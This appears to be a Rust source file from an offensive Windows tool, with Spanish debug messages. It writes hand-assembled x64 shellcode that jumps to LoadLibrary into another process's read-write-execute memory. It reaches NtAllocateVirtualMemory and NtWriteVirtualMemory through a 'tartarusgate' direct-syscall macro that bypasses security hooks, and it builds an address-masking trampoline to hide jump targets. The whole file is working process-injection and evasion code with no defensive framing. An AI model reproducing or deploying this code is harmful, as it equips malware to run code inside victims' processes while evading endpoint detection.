use std::ffi::c_void;
use std::ptr::null_mut;

use windows::Win32::Foundation::HANDLE;

use crate::{debug, tartarusgate};

pub fn loadlibrary_gadged(address_loadlibrary: *mut u8, process_handle: HANDLE) -> Result<usize, Box<dyn std::error::Error>> {
    unsafe {
        let mut load_library_instructions: [u8; 22] = [
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x49, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00,
            0x48, 0x31, 0xD2,
            0xFF, 0xE0
        ];

        let addr_bytes = (address_loadlibrary as usize).to_le_bytes();
        load_library_instructions[2..10].copy_from_slice(&addr_bytes);

        let mut base_addr: *mut c_void = null_mut();
        let mut region_size: usize = load_library_instructions.len();

        let status = tartarusgate!("NtAllocateVirtualMemory", process_handle.0 as usize, (&mut base_addr as *mut *mut c_void) as usize, 0, (&mut region_size as *mut usize) as usize, 0x3000, 0x40);
        debug!("Status NtAllocateVirtualMemory: {status:X}");
        if status != 0 {
            debug!("No se pudo alojar memoria virtual");
        }

        let mut written_bytes: usize = 0;
        let status = tartarusgate!("NtWriteVirtualMemory", process_handle.0 as usize, base_addr, load_library_instructions.as_ptr() as usize, load_library_instructions.len() as usize, &mut written_bytes as *mut _ as usize);
        debug!("Status NtWriteVirtualMemory: {status:X}");
        if status != 0 {
            debug!("No se pudo escribir en la memoria virtual");
        }
        debug!("Bytes escritos en el prceso {:?} - {:?}", load_library_instructions.len(), written_bytes);

        Ok(base_addr as usize)
    }
}

pub fn create_obfuscated_trampoline(target_addr: usize) -> Vec<u8> {
    let mut tramp = Vec::new();

    let offset: u64 = 0xDEADC0DE;
    let masked_addr = (target_addr as u64).wrapping_sub(offset);

    tramp.extend_from_slice(&[0x48, 0xB8]);
    tramp.extend_from_slice(&masked_addr.to_le_bytes());

    tramp.extend_from_slice(&[0x48, 0xBB]);
    tramp.extend_from_slice(&offset.to_le_bytes());

    tramp.extend_from_slice(&[0x48, 0x01, 0xD8]);

    tramp.push(0x50);
    tramp.push(0xC3);

    tramp
}
